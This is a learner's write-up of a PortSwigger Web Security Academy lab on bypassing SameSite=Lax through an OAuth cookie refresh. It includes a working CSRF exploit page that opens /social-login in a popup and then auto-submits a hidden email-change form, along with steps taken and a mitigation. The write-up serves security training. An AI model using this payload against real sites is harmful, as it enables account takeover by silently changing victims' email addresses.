## Lab 10: SameSite Lax Bypass via Cookie Refresh

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

Cross-Site Request Forgery / SameSite Lax / OAuth Cookie Refresh

### Lab Status

Solved

### Objective

Exploit a CSRF vulnerability by refreshing the victim's session cookie through the OAuth login flow, then sending a cross-site POST request.

### Simple Explanation

The email change function did not use a CSRF token.

The session cookie did not explicitly set a `SameSite` value, so Chrome applied the default behavior:

```text id="h914x3"
SameSite=Lax
```

Normally, `SameSite=Lax` blocks cookies on cross-site POST requests.

However, newly created cookies may still be sent in cross-site POST requests for a short time.

The exploit refreshed the victim's session cookie by opening:

```text id="e36xdv"
/social-login
```

Then it submitted the email change form after a short delay.

### What OAuth Login Means

OAuth login is a login method where a website uses another trusted service to confirm the user's identity.

For example:

```text id="3jyzyg"
Login with Google
Login with Facebook
Login with social media
```

After the login finishes, the user is redirected back to the website, and the website creates a new session cookie.

In this lab, the OAuth flow was used to refresh the session cookie before sending the CSRF request.

### Vulnerability Description

The application relied on `SameSite=Lax` behavior instead of using a CSRF token.

The `/social-login` endpoint started the OAuth flow and caused the website to issue a new session cookie.

Because the cookie was fresh, Chrome allowed it to be included in a cross-site POST request for a short time.

This allowed the CSRF attack to work.

### Exploit Used

```html id="x375jp"
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="samesite-refresh@test.com">
</form>

<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

### Exploit Explanation

The victim clicks anywhere on the exploit page.

The click allows the browser to open a popup without blocking it.

The popup opens:

```text id="5v9s4x"
/social-login
```

This refreshes the victim's session cookie through the OAuth flow.

After 5 seconds, the exploit submits the email change form.

Because the session cookie is newly refreshed, it is included in the cross-site POST request.

### Steps Taken

Logged in using the social login option:

```text id="dejdm2"
Username: wiener
Password: peter
```

Changed the email normally and captured the request in Burp.

Confirmed that the email change request did not contain a CSRF token.

Checked that the session cookie was set after the OAuth callback.

Created an exploit that opens `/social-login` in a popup after a click.

Added a delay using:

```text id="vb0ln6"
setTimeout(changeEmail, 5000)
```

Submitted the email change form after the cookie refresh.

Tested the exploit on my own account.

Changed the email value to a new victim email.

Delivered the exploit to the victim.

The lab was solved.

### Result

The victim's email was changed by refreshing the session cookie and then sending a CSRF POST request.

### What I Learned

I learned that `SameSite=Lax` is not a complete CSRF defense, especially when a login flow can refresh the session cookie.

### Security Impact

An attacker could perform sensitive actions if they can refresh the victim's session cookie and send a CSRF request shortly after.

### Mitigation

Use proper CSRF tokens for sensitive actions and do not rely only on SameSite cookie behavior.

### Tools Used

PortSwigger Web Security Academy

Burp Suite Community Edition

Burp Proxy

Exploit Server

Web Browser
